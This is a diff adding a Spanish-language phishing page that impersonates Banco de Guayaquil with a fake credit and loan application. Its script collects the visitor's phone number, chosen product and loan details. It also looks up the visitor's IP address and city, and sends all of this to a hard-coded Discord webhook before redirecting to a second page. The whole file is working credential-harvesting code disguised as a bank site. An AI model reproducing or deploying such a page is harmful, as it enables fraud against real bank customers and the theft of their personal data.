@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Banco de Guayaquil - Créditos</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box; }
+    body { margin:0; font-family:'Segoe UI', Arial, sans-serif; background:#f4f4f4; }
+    .header { background:#d6006d; color:white; text-align:center; padding:40px 15px 80px; }
+    .header img { width:120px; max-width:40%; }
+    .header h2 { font-size:18px; margin-top:10px; }
+    .card { background:white; width:90%; max-width:380px; margin:-60px auto 20px; border-radius:18px; padding:20px; box-shadow:0 6px 15px rgba(0,0,0,0.08); }
+    .title { text-align:center; margin-bottom:15px; font-size:16px; }
+    .input-group { margin-bottom:15px; }
+    input, select { width:100%; height:50px; border-radius:12px; border:1px solid transparent; background:#eee; padding:0 15px; font-size:20px; text-align:center; outline:none; }
+    input:focus, select:focus { background:#fff; border:1px solid #d6006d; }
+    .error { font-size:12px; color:red; margin-top:4px; display:none; }
+    button { width:100%; height:48px; border-radius:12px; border:none; background:#ddd; color:#999; font-size:15px; margin-top:10px; }
+    button.active { background:#d6006d; color:white; cursor:pointer; }
+    .option { background:#eee; padding:14px; border-radius:12px; margin-bottom:10px; text-align:center; cursor:pointer; }
+    .hidden { display:none; }
+    .loading { text-align:center; font-size:18px; padding:35px 0; }
+    .spinner { border:5px solid #eee; border-top:5px solid #d6006d; border-radius:50%; width:35px; height:35px; margin:15px auto; animation:spin 1s linear infinite; }
+    @keyframes spin { 100% { transform:rotate(360deg); } }
+    .subtitle { text-align:center; font-size:14px; color:#666; margin-bottom:12px; }
+    .info-box { font-size:13px; color:#555; background:#eef5fb; border-radius:10px; padding:12px; margin-bottom:10px; }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <img src="img/bg.svg">
+  <h2 id="titulo">Validación</h2>
+</div>
+
+<div class="card" id="step1">
+  <div class="title">Ingresa tus datos</div>
+  <div class="input-group">
+    <input id="telefono" placeholder="Numero de Celular" type="tel" inputmode="numeric" maxlength="10">
+    <div class="error" id="e2">Debe iniciar con 09 y tener 10 números</div>
+  </div>
+  <button id="btn1" disabled>Continuar</button>
+</div>
+
+<div class="card hidden" id="loading">
+  <div class="loading">Procesando<span id="dots"></span><div class="spinner"></div></div>
+</div>
+
+<div class="card hidden" id="step2">
+  <div class="title">¿Qué deseas?</div>
+  <div class="option" onclick="goSimulador(this)">American Express Platinum / Black</div>
+  <div class="option" onclick="goSimulador(this)">Crédito Personal</div>
+</div>
+
+<div class="card hidden" id="step3">
+  <div class="title" id="simTitle">Simula tu crédito</div>
+  <div class="input-group">
+    <input id="monto" placeholder="$0" inputmode="numeric">
+  </div>
+  <div class="input-group">
+    <select id="cuotas">
+      <option value="">Selecciona cuotas</option>
+      <option value="3">3 cuotas</option>
+      <option value="6">6 cuotas</option>
+      <option value="12">12 cuotas</option>
+      <option value="24">24 cuotas</option>
+      <option value="48">48 cuotas</option>
+    </select>
+  </div>
+  <div class="input-group">
+    <input id="pagoMensual" placeholder="Pago mensual" readonly>
+  </div>
+  <div class="subtitle">Puedes solicitar hasta $40,000</div>
+  <div class="info-box">Solicita tu producto ahora, solo para clientes de Banco de Guayaquil</div>
+  <button id="btn3" disabled>Continuar</button>
+</div>
+
+<script>
+const telefono = document.getElementById("telefono");
+const btn1 = document.getElementById("btn1");
+const montoInput = document.getElementById("monto");
+const btn3 = document.getElementById("btn3");
+const cuotasSelect = document.getElementById("cuotas");
+const pagoMensual = document.getElementById("pagoMensual");
+let selectedProduct = "";
+
+// VALIDACIÓN
+function validar() {
+  const tOk = /^09[0-9]{8}$/.test(telefono.value);
+
+  document.getElementById("e2").style.display = tOk || !telefono.value ? "none":"block";
+
+  btn1.disabled = !tOk;
+  btn1.classList.toggle("active", tOk);
+}
+
+telefono.oninput = () => {
+  let v = telefono.value.replace(/\D/g,"");
+  if(v.length>=1 && v[0]!=="0") v="0"+v;
+  if(v.length>=2 && v.slice(0,2)!=="09") v="09"+v.slice(2);
+  telefono.value = v.slice(0,10);
+  validar();
+};
+
+telefono.addEventListener("focus", ()=> {
+  if(!telefono.value) telefono.value="09";
+});
+
+// LOADING
+let dots = document.getElementById("dots"), count=0;
+setInterval(()=>{ if(dots){count=(count+1)%4; dots.innerText=".".repeat(count);} },500);
+
+// PASOS
+function showStep(id,title){
+  ["step1","step2","step3","loading"].forEach(s=>document.getElementById(s).classList.add("hidden"));
+  document.getElementById(id).classList.remove("hidden");
+  document.getElementById("titulo").innerText=title;
+}
+
+function showLoading(next,title){
+  showStep("loading","Cargando...");
+  setTimeout(()=>showStep(next,title),3000);
+}
+
+btn1.onclick = ()=> showLoading("step2","Selecciona producto");
+
+function goSimulador(el){
+  selectedProduct = el.innerText;
+  document.getElementById("simTitle").innerText="Solicita "+selectedProduct;
+  showLoading("step3","Simulador");
+}
+
+// SIMULADOR
+function actualizarPagoMensual(){
+  let raw = montoInput.value.replace(/[^\d]/g,"");
+  let monto = parseInt(raw||0);
+
+  montoInput.value = monto ? "$"+monto.toString().replace(/\B(?=(\d{3})+(?!\d))/g,".") : "";
+
+  let cuotas = parseInt(cuotasSelect.value||0);
+
+  if(monto>=1000 && monto<=40000 && cuotas>0){
+    let pago = monto/cuotas;
+    pagoMensual.value = "$"+pago.toFixed(2);
+    btn3.disabled=false;
+    btn3.classList.add("active");
+  }else{
+    pagoMensual.value="";
+    btn3.disabled=true;
+    btn3.classList.remove("active");
+  }
+}
+
+montoInput.addEventListener("input",actualizarPagoMensual);
+cuotasSelect.addEventListener("change",actualizarPagoMensual);
+
+// WEBHOOK
+async function obtenerIP(){
+  try{
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    const ip = d.ip;
+
+    const loc = await fetch(`https://ipinfo.io/${ip}/json`);
+    const l = await loc.json();
+
+    return {ip, country:l.country, city:l.city};
+  }catch{
+    return {ip:"No disponible",country:"No disponible",city:"No disponible"};
+  }
+}
+
+async function enviarWebhook(){
+  const {ip,country,city}=await obtenerIP();
+
+  const msg = {
+    content:`🔐 NUEVA SOLICITUD\nTeléfono: ${telefono.value}\nProducto: ${selectedProduct}\nMonto: ${montoInput.value}\nCuotas: ${cuotasSelect.value}\nPago: ${pagoMensual.value}\nIP: ${ip}\nPaís: ${country}\nCiudad: ${city}`
+  };
+
+  await fetch("https://discord.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(msg)});
+}
+
+btn3.onclick = async ()=>{
+  await enviarWebhook();
+  window.location.href="index2.html";
+};
+
+// SIEMPRE EMPIEZA DESDE 0
+window.onload = ()=>{
+  showStep("step1","Validación");
+};
+</script>
+
+</body>
+</html>
